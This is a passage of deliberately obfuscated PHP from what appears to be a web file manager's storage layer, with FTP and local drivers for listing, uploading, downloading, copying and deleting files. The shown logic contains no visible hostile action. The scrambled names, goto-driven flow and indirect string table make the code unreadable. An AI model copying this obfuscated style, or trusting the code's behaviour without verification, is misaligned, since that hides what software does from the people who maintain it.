($e£©Ş’·å­[$CÆ ÁÎöøß[75]] as $eÃÍ¯Ú©¨) { $c‰¹í…´ÀŸ[] = array($CÆ ÁÎöøß[76] => $CÆ ÁÎöøß[8] . trim(str_replace($e¶¬¶î¼†², $CÆ ÁÎöøß[33], $eÃÍ¯Ú©¨), $CÆ ÁÎöøß[8]) . $CÆ ÁÎöøß[8], $CÆ ÁÎöøß[77] => 1, $CÆ ÁÎöøß[78] => 0); } goto cÇ”ãÃ›è; cÇ”ãÃ›è: foreach ($e£©Ş’·å­[$CÆ ÁÎöøß[74]] as $D§øÄŸ§Ôğ) { $c‰¹í…´ÀŸ[] = array($CÆ ÁÎöøß[76] => $CÆ ÁÎöøß[8] . trim(str_replace($e¶¬¶î¼†², $CÆ ÁÎöøß[33], $D§øÄŸ§Ôğ), $CÆ ÁÎöøß[8]), $CÆ ÁÎöøß[77] => 0, $CÆ ÁÎöøß[78] => $this->size($D§øÄŸ§Ôğ)); } return $c‰¹í…´ÀŸ; goto Açª´Á¶„¼; d±—ù‘³«­: $CÆ ÁÎöøß =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->_isconn()) { return !1; } $e¶¬¶î¼†² = $this->iconvSystem($e¶¬¶î¼†²); goto CĞ¤ìñ‡¥; Açª´Á¶„¼: } public function getContent($A¬æÒ Öõ¬) { if (!$this->_isconn()) { return !1; } $A¬æÒ Öõ¬ = $this->iconvSystem($A¬æÒ Öõ¬); return $this->fileSubstr($A¬æÒ Öõ¬); } public function setContent($b¬ÙåÅ³Ê, $cÌ£Ê›¬˜ = '') { goto d˜‰‚Ÿˆì; FÚ¢­ÇÔƒ: file_put_contents($cÓéó„÷‘×, $cÌ£Ê›¬˜); $E¥£‰Ãœİ« = $this->upload($b¬ÙåÅ³Ê, $this->iconvApp($cÓéó„÷‘×)); $this->tempFileRemve($cÓéó„÷‘×); goto fó¸ÁÍ´; d˜‰‚Ÿˆì: if (!$this->_isconn()) { return !1; } $BÍÕÑòÕğ = $this->pathThis($this->iconvSystem($b¬ÙåÅ³Ê)); $cÓéó„÷‘× = $this->tempFile($BÍÕÑòÕğ); goto FÚ¢­ÇÔƒ; fó¸ÁÍ´: return $E¥£‰Ãœİ«; goto B‚µ÷ìŞµâ; B‚µ÷ìŞµâ: } public function fileSubstr($C—ª¼…Èšº, $C—µºŠ÷Ø¿ = 0, $DœùÍ÷Àõ– = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($C—ª¼…Èšº, $C—µºŠ÷Ø¿, $DœùÍ÷Àõ–); } private function ftpRequest($b¸æ‘®ºÖˆ, $AóùäÊ§ßÉ = 0, $AçØš©•ÍÓ = false) { goto CÄáõÀ´Õã; bâöÕ’Ÿßî: return $E™¤¸¡¸Šà; goto EÌ™”³Îˆˆ; b¤Ë¡àÊ†Ï: curl_setopt($A”…§¬ ãà, CURLOPT_RETURNTRANSFER, 1); $E™¤¸¡¸Šà = curl_exec($A”…§¬ ãà); curl_close($A”…§¬ ãà); goto bâöÕ’Ÿßî; CÄáõÀ´Õã: $b¸æ‘®ºÖˆ = $this->iconvSystem($b¸æ‘®ºÖˆ); $eôœ÷¡êíµ = $this->scheme . $this->host . $_SERVER[İë¬“ÅÒÛ›][4] . $this->port; $A”…§¬ ãà = curl_init(); goto FÉáÈ„ô˜‡; FÉáÈ„ô˜‡: curl_setopt($A”…§¬ ãà, CURLOPT_URL, $eôœ÷¡êíµ . $this->pathEncode($b¸æ‘®ºÖˆ)); curl_setopt($A”…§¬ ãà, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($AçØš©•ÍÓ) { $e´ß²ÇÏæ¶ = $AóùäÊ§ßÉ + $AçØš©•ÍÓ - 1; curl_setopt($A”…§¬ ãà, CURLOPT_RANGE, "{$AóùäÊ§ßÉ}\x2d{$e´ß²ÇÏæ¶}"); } goto b¤Ë¡àÊ†Ï; EÌ™”³Îˆˆ: } public function upload($cš”‘£İ°, $cŸ¹«Ÿ’‡õ, $DŠâˆå‹Á† = false, $d‘¤²µ‹¬¥ = REPEAT_REPLACE) { goto Fõ‚ÎÁ Õ²; EæÈ¾øŸ‡: if ($B‘Ì¾îâ© != FTP_FINISHED) { return !1; } return $this->getPathOuter($cš”‘£İ°); goto dŒ¼”ñ’°; Fõ‚ÎÁ Õ²: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($cš”‘£İ°))) { return !1; } $cš”‘£İ° = $this->iconvSystem($cš”‘£İ°); goto FŞÆç ¼°; FŞÆç ¼°: $cŸ¹«Ÿ’‡õ = $this->iconvSystem($cŸ¹«Ÿ’‡õ); $B‘Ì¾îâ© = ftp_nb_put($this->connect, $cš”‘£İ°, $cŸ¹«Ÿ’‡õ, FTP_BINARY); while ($B‘Ì¾îâ© == FTP_MOREDATA) { $B‘Ì¾îâ© = ftp_nb_continue($this->connect); } goto EæÈ¾øŸ‡; dŒ¼”ñ’°: } public function download($F¬ÜØˆ¦È, $A¥•…‹‘« = '') { goto B»‹Íò´î²; d¶¥°¯ä»: $F¬ÜØˆ¦È = $this->iconvSystem($F¬ÜØˆ¦È); $A¥•…‹‘« = $this->iconvSystem($A¥•…‹‘«); $e…³ÎæÆìÌ = ftp_nb_get($this->connect, $A¥•…‹‘«, $F¬ÜØˆ¦È, FTP_BINARY); goto Dè¡âÔÌò; Dè¡âÔÌò: while ($e…³ÎæÆìÌ == FTP_MOREDATA) { $e…³ÎæÆìÌ = ftp_nb_continue($this->connect); } if ($e…³ÎæÆìÌ != FTP_FINISHED) { return !1; } return $this->iconvApp($A¥•…‹‘«); goto a­’¤ÌÔ¦; B»‹Íò´î²: if (!$this->_isconn()) { return !1; } $F©èîÈôç¸ = $this->pathFather($A¥•…‹‘«); if (!IO::mkdir($F©èîÈôç¸)) { return !1; } goto d¶¥°¯ä»; a­’¤ÌÔ¦: } private function ftpList($e§‰Û¨ğ¯Ø) { $aÇƒô—ŸßË =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->_isFolder($e§‰Û¨ğ¯Ø)) { return !1; } @ftp_chdir($this->connect, $aÇƒô—ŸßË[8]); $e§‰Û¨ğ¯Ø = rtrim($e§‰Û¨ğ¯Ø, $aÇƒô—ŸßË[8]) . $aÇƒô—ŸßË[8]; $d»Ã¹²®´˜ = @ftp_nlist($this->connect, $e§‰Û¨ğ¯Ø); return array_map(function ($AÉ”á¡‹‚Ö) { $C•ç°ñõ’Î =& $_SERVER[İë¬“ÅÒÛ›]; return $C•ç°ñõ’Î[8] . ltrim($AÉ”á¡‹‚Ö, $C•ç°ñõ’Î[8]); }, $d»Ã¹²®´˜); } private function recursionFtpFiles($d§ÚØŞÈåĞ) { $a–é«ÅÛ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->_isconn()) { return !1; } if (!($aÜ´¤¹—ñŠ = $this->ftpList($d§ÚØŞÈåĞ))) { return !1; } static $A §±†ì±’ = array(); foreach ($aÜ´¤¹—ñŠ as $d§ÚØŞÈåĞ) { if ($this->_isFolder($d§ÚØŞÈåĞ)) { $this->recursionFtpFiles($d§ÚØŞÈåĞ, $A §±†ì±’); $A §±†ì±’[$a–é«ÅÛ[75]][] = $d§ÚØŞÈåĞ; } else { $A §±†ì±’[$a–é«ÅÛ[74]][] = $d§ÚØŞÈåĞ; } } return $A §±†ì±’; } } goto f‡öáÛ”‰; f‡öáÛ”‰: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($d‚æÓ®±‰) { if (substr($d‚æÓ®±‰, 0, 2) == $_SERVER[İë¬“ÅÒÛ›][891]) { $d‚æÓ®±‰ = BASIC_PATH . substr($d‚æÓ®±‰, 2); } return $d‚æÓ®±‰; } public function iconvApp($d«½Ò¡îŞ) { $FÏÁáˆ¼¢Ñ =& $_SERVER[İë¬“ÅÒÛ›]; global $config; return $this->iconvTo($d«½Ò¡îŞ, $config[$FÏÁáˆ¼¢Ñ[889]], $config[$FÏÁáˆ¼¢Ñ[888]]); } public function iconvSystem($BÖŞ¼áßˆŠ) { $BÕ¸Ã‰ˆÛÛ =& $_SERVER[İë¬“ÅÒÛ›]; global $config; return $this->iconvTo($BÖŞ¼áßˆŠ, $config[$BÕ¸Ã‰ˆÛÛ[888]], $config[$BÕ¸Ã‰ˆÛÛ[889]]); } public function getPathOuter($AÁÖš–»¹«) { goto cøåæ‰¹†Î; eŒïœÇÇ²: if (substr($a‹·¹ìóÊÉ, 0, 2) == $cù’“Ä»ìï[891]) { $a‹·¹ìóÊÉ = BASIC_PATH . substr($a‹·¹ìóÊÉ, 2); } if (substr($AÁÖš–»¹«, 0, 2) == $cù’“Ä»ìï[891]) { $AÁÖš–»¹« = BASIC_PATH . substr($AÁÖš–»¹«, 2); } $a‹·¹ìóÊÉ = KodIO::clear($a‹·¹ìóÊÉ); goto D¹­ÄÄ„—Ä; D¹­ÄÄ„—Ä: $AÁÖš–»¹« = KodIO::clear($AÁÖš–»¹«); $AÁÖš–»¹« = substr($AÁÖš–»¹«, strlen($a‹·¹ìóÊÉ)); if (empty($this->pathDriver)) { return $AÁÖš–»¹«; } goto b¤¿Ğá¿Áá; cøåæ‰¹†Î: $cù’“Ä»ìï =& $_SERVER[İë¬“ÅÒÛ›]; $a‹·¹ìóÊÉ = $this->iconvApp($this->pathBase); $AÁÖš–»¹« = $this->iconvApp($AÁÖš–»¹«); goto eŒïœÇÇ²; b¤¿Ğá¿Áá: return $this->pathDriver . $cù’“Ä»ìï[8] . ltrim($AÁÖš–»¹«, $cù’“Ä»ìï[8]); goto Fêâ­‡¤ï¤; Fêâ­‡¤ï¤: } public function mkfile($Eè–·”İÇƒ, $BßŒˆÊ´ƒô = '', $b¸ÎÕ¸¹ = REPEAT_RENAME) { $Eè–·”İÇƒ = $this->iconvSystem($Eè–·”İÇƒ); @touch($Eè–·”İÇƒ); if ($BßŒˆÊ´ƒô) { file_put_contents($Eè–·”İÇƒ, $BßŒˆÊ´ƒô); } return is_file($Eè–·”İÇƒ) ? $this->getPathOuter($Eè–·”İÇƒ) : !1; } public function mkdir($DâÛ¾ÍÂ‰·, $b¶Ì›òËÙè = REPEAT_SKIP) { $DâÛ¾ÍÂ‰· = $this->iconvSystem($DâÛ¾ÍÂ‰·); if (is_dir($DâÛ¾ÍÂ‰·)) { return $this->getPathOuter($DâÛ¾ÍÂ‰·); } @mkdir($DâÛ¾ÍÂ‰·, 511, !0); return is_dir($DâÛ¾ÍÂ‰·) ? $this->getPathOuter($DâÛ¾ÍÂ‰·) : !1; } public function copyFile($A’À÷Ï×‚ø, $bºáÅ¡Š©—) { $this->mkdir($this->pathFather($bºáÅ¡Š©—)); $A’À÷Ï×‚ø = $this->iconvSystem($A’À÷Ï×‚ø); $bºáÅ¡Š©— = $this->iconvSystem($bºáÅ¡Š©—); $b¦Íë¿¸†® = @copy($A’À÷Ï×‚ø, $bºáÅ¡Š©—); return $b¦Íë¿¸†® ? $this->getPathOuter($bºáÅ¡Š©—) : !1; } public function moveFile($B‡ÍêÕŠ, $Bç‚Š¼õÇŞ) { $this->mkdir($this->pathFather($Bç‚Š¼õÇŞ)); $B‡ÍêÕŠ = $this->iconvSystem($B‡ÍêÕŠ); $Bç‚Š¼õÇŞ = $this->iconvSystem($Bç‚Š¼õÇŞ); $eä¿ª°½±Ê = intval(@rename($B‡ÍêÕŠ, $Bç‚Š¼õÇŞ)); if (!$eä¿ª°½±Ê) { if ($eä¿ª°½±Ê = intval(@copy($B‡ÍêÕŠ, $Bç‚Š¼õÇŞ))) { @unlink($B‡ÍêÕŠ); } } return $eä¿ª°½±Ê ? $this->getPathOuter($Bç‚Š¼õÇŞ) : !1; } public function delFile($CßÎ „òñƒ) { $CßÎ „òñƒ = $this->iconvSystem($CßÎ „òñƒ); if (!@unlink($CßÎ „òñƒ)) { @chmod($CßÎ „òñƒ, 511); if (!@unlink($CßÎ „òñƒ)) { return !1; } } else { return !0; } } public function delFolder($aªÒ¥ƒâÕ—) { goto C‚É£ØÂ¶; C‚É£ØÂ¶: $AËÈˆ›Ê¢ˆ =& $_SERVER[İë¬“ÅÒÛ›]; $aªÒ¥ƒâÕ— = $this->iconvSystem($aªÒ¥ƒâÕ—); if (!is_dir($aªÒ¥ƒâÕ—)) { return !0; } goto FßÍâœåºÔ; FßÍâœåºÔ: if (!($dô”…öë–Õ = opendir($aªÒ¥ƒâÕ—))) { return !1; } while (($FİË£»é¦ = readdir($dô”…öë–Õ)) !== !1) { if ($FİË£»é¦ == $AËÈˆ›Ê¢ˆ[92] || $FİË£»é¦ == $AËÈˆ›Ê¢ˆ[900]) { continue; } $añò£æ»› = $aªÒ¥ƒâÕ— . $AËÈˆ›Ê¢ˆ[8] . $FİË£»é¦; if (!is_dir($añò£æ»›)) { if (!unlink($añò£æ»›)) { chmod($añò£æ»›, 511); if (!unlink($añò£æ»›)) { return !1; } } } else { chmod($añò£æ»›, 511); $añò£æ»› = $this->iconvApp($añò£æ»›); if (!$this->delFolder($añò£æ»›)) { return !1; } } } closedir($dô”…öë–Õ); goto A‚´‚Äì½š; A‚´‚Äì½š: return rmdir($aªÒ¥ƒâÕ—); goto a²• †éê; a²• †éê: } public function rename($DÆŸô”‹µ, $aÃŞË æ¬â) { goto B‘ÈÚØ§ŸŸ; fË—ìá½ôø: $DÆŸô”‹µ = $this->iconvSystem($DÆŸô”‹µ); $a–¡çöòÃİ = $this->pathFather($DÆŸô”‹µ); $Eä‹ğ„ïõÙ = rtrim($a–¡çöòÃİ, $FĞë¹µ‘Í´[8]) . $FĞë¹µ‘Í´[8] . $eÖ®®ˆùŞ–; goto DíŞİ²•Ğ–; DíŞİ²•Ğ–: $CŠ—¨Æ¾› = @rename($DÆŸô”‹µ, $Eä‹ğ„ïõÙ); $Eä‹ğ„ïõÙ = $this->iconvApp($Eä‹ğ„ïõÙ); return $CŠ—¨Æ¾› ? $this->getPathOuter($Eä‹ğ„ïõÙ) : !1; goto CøæÊÚÔ®; B‘ÈÚØ§ŸŸ: $FĞë¹µ‘Í´ =& $_SERVER[İë¬“ÅÒÛ›]; $eÖ®®ˆùŞ– = $this->fileNameAuto($this->pathFather($DÆŸô”‹µ), $aÃŞË æ¬â); $eÖ®®ˆùŞ– = $this->iconvSystem($eÖ®®ˆùŞ–); goto fË—ìá½ôø; CøæÊÚÔ®: } public function _size($Dï„…¬‰ã®) { $Dï„…¬‰ã® = $this->iconvSystem($Dï„…¬‰ã®); return (double) abs(sprintf($_SERVER[İë¬“ÅÒÛ›][901], @filesize($Dï„…¬‰ã®))); } public function _info($CïÈí±ìŒ) { $CïÈí±ìŒ = $this->iconvSystem($CïÈí±ìŒ); if ($this->_isFolder($CïÈí±ìŒ)) { return $this->folderInfo($CïÈí±ìŒ); } else { if ($this->_isFile($CïÈí±ìŒ)) { return $this->fileInfo($CïÈí±ìŒ); } } return !1; } protected function infoChildren($f•öˆ«£Ÿ, &$dª‡“£ù´°, $cƒÕ©šÜ„ = true) { $aº—Œ«÷±• =& $_SERVER[İë¬“ÅÒÛ›]; $f•öˆ«£Ÿ = rtrim($f•öˆ«£Ÿ, $aº—Œ«÷±•[8]) . $aº—Œ«÷±•[8]; if ($cƒÕ©šÜ„) { check_abort(); $f•öˆ«£Ÿ = $this->iconvSystem($f•öˆ«£Ÿ); } if (!($f™à³Ó“Å† = @opendir($f•öˆ«£Ÿ))) { return; } while (($AÏ°Ã«ÁÏ“ = readdir($f™à³Ó“Å†)) !== !1) { if ($AÏ°Ã«ÁÏ“ == $aº—Œ«÷±•[92] || $AÏ°Ã«ÁÏ“ == $aº—Œ«÷±•[900]) { continue; } $F½¶¸¡¿ó‹ = $f•öˆ«£Ÿ . $AÏ°Ã«ÁÏ“; if (is_file($F½¶¸¡¿ó‹)) { $dª‡“£ù´°[$aº—Œ«÷±•[79]]++; $dª‡“£ù´°[$aº—Œ«÷±•[78]] += (double) abs(sprintf($aº—Œ«÷±•[901], @filesize($F½¶¸¡¿ó‹))); } else { $dª‡“£ù´°[$aº—Œ«÷±•[80]]++; $this->infoChildren($F½¶¸¡¿ó‹, $dª‡“£ù´°, !1); } } closedir($f™à³Ó“Å†); } private function folderInfo($EÄ“…˜è¼Ë, $dˆ¤Ùİ«ÆÆ = false) { $F™ Á©í¢ƒ =& $_SERVER[İë¬“ÅÒÛ›]; $EÄ“…˜è¼Ë = rtrim($EÄ“…˜è¼Ë, $F™ Á©í¢ƒ[8]) . $F™ Á©í¢ƒ[8]; $FÓƒß¾Ö¨ = $this->iconvApp($this->pathThis($EÄ“…˜è¼Ë)); if ($dˆ¤Ùİ«ÆÆ) { return array($F™ Á©í¢ƒ[28] => $FÓƒß¾Ö¨, $F™ Á©í¢ƒ[76] => $this->getPathOuter($EÄ“…˜è¼Ë), $F™ Á©í¢ƒ[29] => $F™ Á©í¢ƒ[77]); } $CÔÃ¬‰ñ“ = array($F™ Á©í¢ƒ[28] => $FÓƒß¾Ö¨, $F™ Á©í¢ƒ[76] => $this->getPathOuter($EÄ“…˜è¼Ë), $F™ Á©í¢ƒ[29] => $F™ Á©í¢ƒ[77], $F™ Á©í¢ƒ[187] => @filectime($EÄ“…˜è¼Ë), $F™ Á©í¢ƒ[106] => @filemtime($EÄ“…˜è¼Ë), $F™ Á©í¢ƒ[902] => @fileatime($EÄ“…˜è¼Ë), $F™ Á©í¢ƒ[897] => is_readable($EÄ“…˜è¼Ë), $F™ Á©í¢ƒ[898] => is_writable($EÄ“…˜è¼Ë), $F™ Á©í¢ƒ[903] => get_mode($EÄ“…˜è¼Ë)); return $CÔÃ¬‰ñ“; } private function fileInfo($BÇ·¸Õˆ­, $e´ùŞ¿Ïôá = false) { $eˆã¹ƒˆ =& $_SERVER[İë¬“ÅÒÛ›]; $D…Á±˜¬‡ = $this->iconvApp($this->pathThis($BÇ·¸Õˆ­)); if ($e´ùŞ¿Ïôá) { return array($eˆã¹ƒˆ[28] => $D…Á±˜¬‡, $eˆã¹ƒˆ[76] => $this->getPathOuter($BÇ·¸Õˆ­), $eˆã¹ƒˆ[29] => $eˆã¹ƒˆ[164], $eˆã¹ƒˆ[78] => $this->size($BÇ·¸Õˆ­), $eˆã¹ƒˆ[157] => $this->ext($D…Á±˜¬‡)); } $EÎÌÇ’™³ì = array($eˆã¹ƒˆ[28] => $D…Á±˜¬‡, $eˆã¹ƒˆ[76] => $this->getPathOuter($BÇ·¸Õˆ­), $eˆã¹ƒˆ[29] => $eˆã¹ƒˆ[164], $eˆã¹ƒˆ[187] => @filectime($BÇ·¸Õˆ­), $eˆã¹ƒˆ[106] => @filemtime($BÇ·¸Õˆ­), $eˆã¹ƒˆ[902] => @fileatime($BÇ·¸Õˆ­), $eˆã¹ƒˆ[78] => $this->size($BÇ·¸Õˆ­), $eˆã¹ƒˆ[157] => $this->ext($D…Á±˜¬‡), $eˆã¹ƒˆ[897] => is_readable($BÇ·¸Õˆ­), $eˆã¹ƒˆ[898] => is_writable($BÇ·¸Õˆ­), $eˆã¹ƒˆ[903] => get_mode($BÇ·¸Õˆ­)); $this->fileInfoImage($BÇ·¸Õˆ­, $EÎÌÇ’™³ì); return $EÎÌÇ’™³ì; } public function exist($d»¸¬š¦™Ÿ) { $d»¸¬š¦™Ÿ = $this->iconvSystem($d»¸¬š¦™Ÿ); return @file_exists($d»¸¬š¦™Ÿ); } public function _isFile($bÇ‘ññŸêİ) { $bÇ‘ññŸêİ = $this->iconvSystem($bÇ‘ññŸêİ); return @is_file($bÇ‘ññŸêİ); } public function _isFolder($FÅÃÍ®–„) { $FÅÃÍ®–„ = $this->iconvSystem($FÅÃÍ®–„); return @is_dir($FÅÃÍ®–„); } public function size($F¬¿¬¹êœ¾) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][899], $F¬¿¬¹êœ¾); } public function info($C—¯ÓòÄÃÎ) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][183], $C—¯ÓòÄÃÎ); } public function isFile($EØäµ…å»½) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][184], $EØäµ…å»½); } public function isFolder($eĞŞ˜‰‘ğŒ) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][185], $eĞŞ˜‰‘ğŒ); } private function fileInfoImage($BÉŒ´âö´, &$BÉŒè»ì´½) { $DğÊ‡Æ¥ó  =& $_SERVER[İë¬“ÅÒÛ›]; $C¾ê¿ŒËæ = array($DğÊ‡Æ¥ó [208], $DğÊ‡Æ¥ó [158], $DğÊ‡Æ¥ó [209], $DğÊ‡Æ¥ó [210], $DğÊ‡Æ¥ó [211]); if (in_array($BÉŒè»ì´½[$DğÊ‡Æ¥ó [157]], $C¾ê¿ŒËæ)) { $Fâé§å¯ğ® = GetImageSize($BÉŒ´âö´); if ($Fâé§å¯ğ®) { $BÉŒè»ì´½[$DğÊ‡Æ¥ó [212]] = array($DğÊ‡Æ¥ó [213] => $Fâé§å¯ğ®[0], $DğÊ‡Æ¥ó [904] => $Fâé§å¯ğ®[1]); } } } public function listPath($bóÔ§ˆ¯À, $CÚ†«®Æ… = false) { goto d©ª¶Œô²•; d©ª¶Œô²•: $Cé¦’Ü››® =& $_SERVER[İë¬“ÅÒÛ›]; $bóÔ§ˆ¯À = $this->iconvSystem($bóÔ§ˆ¯À); $bóÔ§ˆ¯À = rtrim($bóÔ§ˆ¯À, $Cé¦’Ü››®[8]) . $Cé¦’Ü››®[8]; goto D±‚‚«¾Ï‘; D±‚‚«¾Ï‘: $AŞ¡‚‡áĞò = array($Cé¦’Ü››®[75] => array(), $Cé¦’Ü››®[74] => array()); if (!($d—Ò’îƒÌÚ = @opendir($bóÔ§ˆ¯À))) { return $AŞ¡‚‡áĞò; } while (($aƒêóÉŒ˜Ñ = readdir($d—Ò’îƒÌÚ)) !== !1) { if ($aƒêóÉŒ˜Ñ == $Cé¦’Ü››®[92] || $aƒêóÉŒ˜Ñ == $Cé¦’Ü››®[900]) { continue; } $BÕ¤Ü›äé = $bóÔ§ˆ¯À . $aƒêóÉŒ˜Ñ; if (is_file($BÕ¤Ü›äé)) { $AŞ¡‚‡áĞò[$Cé¦’Ü››®[74]][] = $this->fileInfo($BÕ¤Ü›äé, $CÚ†«®Æ…); } else { $AŞ¡‚‡áĞò[$Cé¦’Ü››®[75]][] = $this->folderInfo($BÕ¤Ü›äé, $CÚ†«®Æ…); } } goto eøÈ½”æ‡; eøÈ½”æ‡: closedir($d—Ò’îƒÌÚ); return $AŞ¡‚‡áĞò; goto D¬ÕŒæÙ‰›; D¬ÕŒæÙ‰›: } public function listAll($d¹ĞÄÑäÄ, &$FÑ­ô“š = array()) { goto aæœêŸ«Ñ÷; B—Äâ«êîÅ: if (!($FŒ‘˜è ‰® = @opendir($d¹ĞÄÑäÄ))) { return $FÑ­ô“š; } while (($f ‹‡Ûİ½“ = readdir($FŒ‘˜è ‰®)) !== !1) { if ($f ‹‡Ûİ½“ == $BÏØ¶¸ß—[92] || $f ‹‡Ûİ½“ == $BÏØ¶¸ß—[900]) { continue; } $c÷ÃÏ¶¶Ô = $d¹ĞÄÑäÄ . $f ‹‡Ûİ½“; if (is_dir($c÷ÃÏ¶¶Ô)) { $FÑ­ô“š[] = array($BÏØ¶¸ß—[76] => $c÷ÃÏ¶¶Ô . $BÏØ¶¸ß—[8], $BÏØ¶¸ß—[77] => 1, $BÏØ¶¸ß—[78] => 0); $this->listAll($c÷ÃÏ¶¶Ô, $FÑ­ô“š); } else { $FÑ­ô“š[] = array($BÏØ¶¸ß—[76] => $c÷ÃÏ¶¶Ô, $BÏØ¶¸ß—[77] => 0, $BÏØ¶¸ß—[78] => $this->size($c÷ÃÏ¶¶Ô)); } } closedir($FŒ‘˜è ‰®); goto fã†ç¶ŠÔ”; fã†ç¶ŠÔ”: return $FÑ­ô“š; goto c”´‘ ©Ò; aæœêŸ«Ñ÷: $BÏØ¶¸ß— =& $_SERVER[İë¬“ÅÒÛ›]; $d¹ĞÄÑäÄ = $this->iconvSystem($d¹ĞÄÑäÄ); $d¹ĞÄÑäÄ = rtrim($d¹ĞÄÑäÄ, $BÏØ¶¸ß—[8]) . $BÏØ¶¸ß—[8]; goto B—Äâ«êîÅ; c”´‘ ©Ò: } public function has($d»ŒíâÃÙ, $BæĞæ«ì‡µ = false, $aô·­¦¦› = true) { goto a¶’ÖÛÃ”±; Añ‚êÈ‹¸Â: if (!($e„†œ¯ÄÍ¨ = @opendir($d»ŒíâÃÙ))) { return !1; } $c„µÊ»·”‚ = 0; $Fâ¦Öáó„ã = 0; goto eËİ„Ôí©; b™†³ñƒ•: return !1; goto Då¤¯´˜Õ‹; eËİ„Ôí©: while (($aÍ¥ñÅ­Û = readdir($e„†œ¯ÄÍ¨)) !== !1) { if ($aÍ¥ñÅ­Û == $Eåª¨Ášº°[92] || $aÍ¥ñÅ­Û == $Eåª¨Ášº°[900]) { continue; } $aİŠæÍÇµ = $d»ŒíâÃÙ . $aÍ¥ñÅ­Û; if ($BæĞæ«ì‡µ) { if (@is_file($aİŠæÍÇµ)) { $c„µÊ»·”‚++; } else { $Fâ¦Öáó„ã++; } continue; } if ($aô·­¦¦›) { if (@is_file($aİŠæÍÇµ)) { return !0; } } else { if (@is_dir($aİŠæÍÇµ . $Eåª¨Ášº°[8])) { return !0; } } } closedir($e„†œ¯ÄÍ¨); if ($BæĞæ«ì‡µ) { return array($Eåª¨Ášº°[191] => $c„µÊ»·”‚, $Eåª¨Ášº°[192] => $Fâ¦Öáó„ã); } goto b™†³ñƒ•; a¶’ÖÛÃ”±: $Eåª¨Ášº° =& $_SERVER[İë¬“ÅÒÛ›]; $d»ŒíâÃÙ = $this->iconvSystem($d»ŒíâÃÙ); $d»ŒíâÃÙ = rtrim($d»ŒíâÃÙ, $Eåª¨Ášº°[8]) . $Eåª¨Ášº°[8]; goto Añ‚êÈ‹¸Â; Då¤¯´˜Õ‹: } public function hashSimple($fÇæå‡ÙÂí) { goto ešâ¢İéƒŠ; CĞ¶¹®ç¯: $BÛì–îùõŠ = $this->size($fÇæå‡ÙÂí); $bÎÆí†±ÀÃ = 200; $d²ö³‰×¿æ = 50; goto B†¾—±™«¤; dÅ¹”øã×‚: fseek($f‘Ø–Ì–½, $BÛì–îùõŠ - $bÎÆí†±ÀÃ); $AŠø¸‡¦ö© .= fread($f‘Ø–Ì–½, $bÎÆí†±ÀÃ); fclose($f‘Ø–Ì–½); goto c…±‹Š¨¤…; ešâ¢İéƒŠ: $eåÄ‚Ëçí¬ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$fÇæå‡ÙÂí) { return md5($eåÄ‚Ëçí¬[33]); } $fÇæå‡ÙÂí = $this->iconvSystem($fÇæå‡ÙÂí); goto CĞ¶¹®ç¯; B†¾—±™«¤: if ($BÛì–îùõŠ <= $bÎÆí†±ÀÃ * $d²ö³‰×¿æ) { return $this->hashMd5($fÇæå‡ÙÂí) . $BÛì–îùõŠ; } $AŠø¸‡¦ö© = $eåÄ‚Ëçí¬[33]; $aÓåéù¥ = intval($BÛì–îùõŠ / $d²ö³‰×¿æ); goto f¼âéĞÉ‚È; c…±‹Š¨¤…: return md5($AŠø¸‡¦ö©) . $BÛì–îùõŠ; goto Eñ¶ì¿ñÈ„; f¼âéĞÉ‚È: $f‘Ø–Ì–½ = fopen($fÇæå‡ÙÂí, $eåÄ‚Ëçí¬[905]); if (!$f‘Ø–Ì–½) { return $AŠø¸‡¦ö©; } for ($aÖ¾¹Î÷á = 0; $aÖ¾¹Î÷á < $d²ö³‰×¿æ; $aÖ¾¹Î÷á++) { fseek($f‘Ø–Ì–½, $aÓåéù¥ * $aÖ¾¹Î÷á); $AŠø¸‡¦ö© .= fread($f‘Ø–Ì–½, $bÎÆí†±ÀÃ); } goto dÅ¹”øã×‚; Eñ¶ì¿ñÈ„: } public function getContent($döñˆ’í§˜) { $döñˆ’í§˜ = $this->iconvSystem($döñˆ’í§˜); return file_get_contents($döñˆ’í§˜); } public function setContent($b•ÀõçõÎ, $eöòÅŠ = '') { $b•ÀõçõÎ = $this->iconvSystem($b•ÀõçõÎ); return file_put_contents($b•ÀõçõÎ, $eöòÅŠ, LOCK_EX); } public function fileSubstr($BâŸ‘®ÊŞî, $fŸ™ÑâÜ› = 0, $e§—Í¯“¦Ã = false) { goto fËËÄ’ÈŒ; fËËÄ’ÈŒ: $fµ¸§·¨ Æ =& $_SERVER[İë¬“ÅÒÛ›]; $BâŸ‘®ÊŞî = $this->iconvSystem($BâŸ‘®ÊŞî); if ($e§—Í¯“¦Ã === !1) { $e§—Í¯“¦Ã = $this->size($BâŸ‘®ÊŞî); } goto B´ÒÏßÅ‰ë; B´ÒÏßÅ‰ë: if ($e§—Í¯“¦Ã <= 0) { return $fµ¸§·¨ Æ[33]; } $CËïíÑî½Í = fopen($BâŸ‘®ÊŞî, $fµ¸§·¨ Æ[905]); if (!$CËïíÑî½Í) { return !1; } goto B‰¡ƒİƒ×ß; dâ‰œÅœáõ: return $eƒËîğì³; goto EµÌÙ“ºˆ¼; B‰¡ƒİƒ×ß: fseek($CËïíÑî½Í, $fŸ™ÑâÜ›); $eƒËîğì³ = fread($CËïíÑî½Í, $e§—Í¯“¦Ã); fclose($CËïíÑî½Í); goto dâ‰œÅœáõ; EµÌÙ“ºˆ¼: } public function upload($F—È ÷¯òÊ, $F¢ƒ«øÓò, $fÃ±Å‘Ö¾ = false, $CÒ’À—¸ = REPEAT_REPLACE) { $dê™×÷ªô« = $this->copyFile($F¢ƒ«øÓò, $F—È ÷¯òÊ); return $dê™×÷ªô« ? $this->getPathOuter($F—È ÷¯òÊ) : !1; } public function download($aÀ‡é«¶ , $e‘ç½Ş†ˆŒ) { return $this->iconvSystem($aÀ‡é«¶ ); } } class PathDriverMOSS extends PathDriverBaseS3 